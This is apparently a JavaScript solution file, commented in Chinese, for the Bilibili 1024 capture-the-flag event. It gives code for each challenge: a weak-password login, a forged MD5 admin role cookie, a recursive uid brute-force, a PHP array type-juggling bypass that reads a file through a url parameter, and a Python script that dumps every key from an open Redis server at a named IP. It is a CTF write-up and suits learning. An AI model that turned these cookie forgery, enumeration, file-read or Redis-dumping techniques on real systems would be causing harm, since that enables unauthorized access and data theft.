//第一题 在<input>中找到data

//第二题，改UA为 "bilibili Security Browser"
$.ajax({
    url: "api/ctf/2",
    type: "get",
    success: function (data) {
        console.log(data.data);
    }
})

//第三题，用户名"admin"，密码"bilibili"
//弱口令
$.ajax({
    url: "api/ctf/3",
    type: "post",
    contentType: "application/json",
    dataType: "json",
    data: JSON.stringify({
        username: "admin",
        passwd: "bilibili",
    }),
    success: function (data) {
        console.log(data.data)
    }
})

//第四题，改cookies中的role为"7b7bc2512ee1fedcd76bdc68926d4f7b"
//这是Administration的32位MD5
$.ajax({
    url: "api/ctf/4",
    type: "get",
    success: function (data) {
        console.log(data.data);
    }
})

//第五题，使用Console向后穷举
get(100336889) //这里每个人有可能不一样，请在网页中查找
function get(uid) {
    $.ajax({
        url: "api/ctf/5?uid=" + uid,
        type: "get",
        success: function (data) {
            if (data.code == 200) {
                console.log(data.data)
            } else {
                get(uid + 1)
            }
        }
    })
}

//第十题（入口在第六题）
//注意：每个人的靶机不一定相同，请注意更换IP
//  1,访问"http://120.92.151.189/blog/test.php"
//  2,将网页中所有的内容复制粘贴到Console中，获取str1和str2
/** 获取示例：
 * var str1 = "\u7a0b\u5e8f\u5458\u6700\u591a\u7684\u5730\u65b9";
 * var str2 = "bilibili1024havefun";
 * console.log()"
*/
//  3,将str1进行Unicode转中文得到 "程序员最多的地方"
//  4,在GitHub搜索str2,即"bilibili1024havefun"
//  5,在搜索结果中找到与end有关的那个,得到以下链接
//      https://github.com/interesting-1024/end/blob/main/end.php
//  6,分析PHP文件,id为不含1的数组，路径不清楚要猜
/** PHP文件示例：
 * <?php
 *
 * //filename end.php
 *
 * $bilibili = "bilibili1024havefun";
 *
 * $str = intval($_GET['id']);
 * $reg = preg_match('/\d/is', $_GET['id']);
 *
 * if(!is_numeric($_GET['id']) and $reg !== 1 and $str === 1){
 *  $content = file_get_contents($_GET['url']);
 *
 * 	//文件路径猜解
 * 	if (false){
 * 		echo "还差一点点啦～";
 * 	}else{
 * 		echo $flag;
 * 	}
 * }else{
 * 	echo "你想要的不在这儿～";
 * }
 * ?>
 */
//  7,构造URL，使满足"!is_numeric($_GET['id']) and $reg !== 1 and $str === 1"
//      "http://120.92.151.189/blog/end.php?id[]=&url="
//  8,猜URL，访问"http://120.92.151.189/blog/end.php?id[]=&url=./flag.txt"
//      图片另存为，并用npp打开
//  9,在文件末尾找到flag

//第八题，连接一个假的redis
//在做本题时可能会遇到redis连接不上的问题，我们使用Python脚本进行轮询
//首先安装redis库："!pip3 install redis"
//接着跑以下脚本：
/** Python文件
 * import redis
 * 
 * print('Connecting the Server...')
 * 
 * while True:
 *     try:
 *         r = redis.StrictRedis(host='120.92.151.189', port=6379)
 *         keys = r.keys()
 *         print('We got the flag:')
 *         for key in keys:
 *             value = r.get(key)
 *             print(key, value)
 *         break
 *     except:
 *         print('Error: Connection timed out')
 *         pass
 */
//就会自己输出答案了(逃)
